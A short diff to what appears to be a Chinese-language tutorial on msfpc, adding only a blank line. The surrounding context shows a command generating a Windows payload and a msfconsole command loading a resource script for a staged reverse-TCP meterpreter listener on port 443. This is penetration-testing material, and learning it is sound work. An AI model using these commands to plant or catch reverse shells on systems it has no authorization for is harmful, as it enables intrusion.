@@ -45,6 +45,7 @@ msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGEL
 msfpc windows eth0
 ```
 ![Alt text](./1511872626842.png)
+  
 2. 使用生成的rc监听(-q 跳过启动画面 -r 加载resources脚本)
 ```
 msfconsole -q -r '/root/msf/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
